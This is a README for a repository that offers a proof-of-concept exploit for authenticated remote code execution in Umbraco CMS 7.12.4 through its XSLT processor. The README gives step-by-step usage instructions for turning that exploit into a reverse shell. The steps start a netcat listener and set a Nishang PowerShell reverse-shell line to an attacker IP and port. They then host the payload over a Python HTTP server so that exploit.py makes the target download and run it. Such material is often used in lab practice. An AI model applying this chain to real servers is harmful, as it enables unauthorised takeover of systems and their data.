# Umbraco CMS 7.12.4 RCE PoC / Reverse Shell

## Overview
This repository contains a Proof-of-Concept (PoC) exploit for an authenticated Remote Code Execution (RCE) vulnerability in Umbraco CMS 7.12.4. 

This exploit, inspired by the original PoC (https://www.exploit-db.com/exploits/46153), leverages a vulnerable XSLT processor to execute arbitrary commands on the server via authenticated access.

The provided script has been modified to download and execute a PowerShell script, such as Nishang's Invoke-PowerShellTcp.ps1 (https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1), which spawns a reverse shell.

## Requirements
Step 1: Clone the Repository

Step 2: Install Dependencies and ensure you have Python 3 installed:
```
pip install requests beautifulsoup4
```

## Usage
Step 1: Open a listening port. For example:
```
nc -vlnp 9090
```

Step 2: Edit the bottom line of the Nishang Invoke-PowerShellTcp.ps1 script to reflect your attacking machine's IP address and listening port. For example:
```
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.12.6 -Port 9090
```

Step 3: Start a simple HTTP server to host the Nishang script in the same directory where Invoke-PowerShellTcp.ps1 is located. For example:
```
python3 -m http.server 80
```
Step 4: Modify lines 30, 35, 36, 37 in exploit.py accordingly to match your setup (i.e., http server address, login, password, host)

Step 5: Run exploit.py

## Reference
Original POC: https://www.exploit-db.com/exploits/46153

nishang: https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
